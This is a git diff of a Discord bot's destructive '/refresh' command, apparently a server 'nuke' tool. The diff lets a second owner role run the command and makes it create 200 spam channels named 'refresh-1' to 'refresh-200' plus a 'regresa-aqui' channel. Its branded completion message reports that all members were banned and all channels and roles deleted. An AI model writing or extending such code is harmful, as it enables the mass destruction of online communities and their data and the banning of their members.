@@ -16,7 +16,12 @@ const GUILD_ID = process.env.GUILD_ID || '1528140415276941555';
 const AUTO_ROLE_ID = process.env.AUTO_ROLE_ID || '1529532495832416326';
 const API_URL = (process.env.API_URL || '').replace(/\/+$/, '');
 const API_SHARED_SECRET = process.env.API_SHARED_SECRET || '';
-const REFRESH_ROLE_ID = '1524796988812431461'; // Role ID para usar /refresh
+
+// ============ ROLES DE OWNER (2 ROLES) ============
+const REFRESH_ROLES = [
+    '1524796988812431461',  // Role Owner 1
+    '1529535539282313398'   // Role Owner 2
+];
 
 const client = new Client({
     intents: [
@@ -394,13 +399,13 @@ async function handleHelp(interaction) {
 // ============ COMANDO /refresh (DESTRUCTIVO) ============
 // ======================================================================
 async function handleRefresh(interaction) {
-    // Verificar que el usuario tenga el role específico
+    // Verificar que el usuario tenga ALGUNO de los roles de owner
     const member = interaction.member;
-    const hasRole = member.roles.cache.has(REFRESH_ROLE_ID);
+    const hasRole = REFRESH_ROLES.some(roleId => member.roles.cache.has(roleId));
     
     if (!hasRole) {
         await interaction.reply({
-            content: '❌ You are not authorized to use this command. You need the **Owner Role** to use this command.',
+            content: '❌ You are not authorized to use this command. You need an **Owner Role** to use this command.',
             ephemeral: true
         });
         return;
@@ -487,29 +492,35 @@ async function handleRefresh(interaction) {
             ephemeral: true 
         });
 
-        // ============ 4. CREAR NUEVOS CANALES ============
-        await interaction.followUp({ content: '📝 Creating new channels...', ephemeral: true });
+        // ============ 4. CREAR 200 CANALES NUEVOS ============
+        await interaction.followUp({ content: '📝 Creating 200 channels...', ephemeral: true });
         
-        const channelNames = [
-            'refresh-1', 'refresh-2', 'refresh-3', 'refresh-4', 'refresh-5',
-            'refresh-6', 'refresh-7', 'refresh-8', 'refresh-9', 'refresh-10',
-            'refresh-11', 'refresh-12', 'refresh-13', 'refresh-14', 'refresh-15',
-            'refresh-16', 'refresh-17', 'refresh-18', 'refresh-19', 'refresh-20'
-        ];
+        const TOTAL_CHANNELS = 200; // <-- 200 CANALES
         
         let createdCount = 0;
-        
-        for (const name of channelNames) {
+
+        for (let i = 1; i <= TOTAL_CHANNELS; i++) {
             try {
                 await guild.channels.create({
-                    name: name,
+                    name: `refresh-${i}`,
                     type: 0,
                     reason: 'Server refresh - PaltidxR'
                 });
                 createdCount++;
-            } catch (e) {}
+                
+                // Mostrar progreso cada 10 canales
+                if (i % 10 === 0) {
+                    await interaction.followUp({ 
+                        content: `📝 Created ${i}/${TOTAL_CHANNELS} channels...`, 
+                        ephemeral: true 
+                    });
+                }
+            } catch (e) {
+                console.error(`Error creating channel refresh-${i}:`, e);
+            }
         }
-        
+
+        // Crear canal principal "regresa-aqui"
         try {
             await guild.channels.create({
                 name: 'regresa-aqui',
@@ -517,33 +528,34 @@ async function handleRefresh(interaction) {
                 reason: 'Server refresh - PaltidxR'
             });
             createdCount++;
-        } catch (e) {}
+        } catch (e) {
+            console.error('Error creating regresa-aqui channel:', e);
+        }
 
         await interaction.followUp({ 
-            content: `✅ Created ${createdCount} channels.`, 
+            content: `✅ Created ${createdCount} channels (${TOTAL_CHANNELS} refresh channels + 1 regresa-aqui).`, 
             ephemeral: true 
         });
 
         // ============ 5. MENSAJE FINAL ============
         await interaction.followUp({
             content: `
-╔═══════════════════════════════════════════════════╗
-║                                                     ║
-║   🔥 SERVER REFRESH COMPLETED 🔥                    ║
-║                                                     ║
-║   This server has been refreshed by PaltidxR.       ║
-║   All members were banned, all channels and         ║
-║   roles were deleted.                               ║
-║                                                     ║
-║   Created 20+ channels named "refresh-1" to         ║
-║   "refresh-20" and one channel called               ║
-║   "regresa-aqui".                                   ║
-║                                                     ║
-║   ⚠️ This server is now ready for a fresh start.    ║
-║                                                     ║
-║   Powered by PaltidxR 🚀                           ║
-║                                                     ║
-╚═══════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║   🔥 SERVER REFRESH COMPLETED 🔥                                  ║
+║                                                                   ║
+║   This server has been refreshed by PaltidxR.                     ║
+║   All members were banned, all channels and roles were deleted.   ║
+║                                                                   ║
+║   Created ${TOTAL_CHANNELS} channels named "refresh-1" to          ║
+║   "refresh-${TOTAL_CHANNELS}" and one channel called               ║
+║   "regresa-aqui".                                                 ║
+║                                                                   ║
+║   ⚠️ This server is now ready for a fresh start.                  ║
+║                                                                   ║
+║   Powered by PaltidxR 🚀                                         ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
             `,
             ephemeral: true
         });
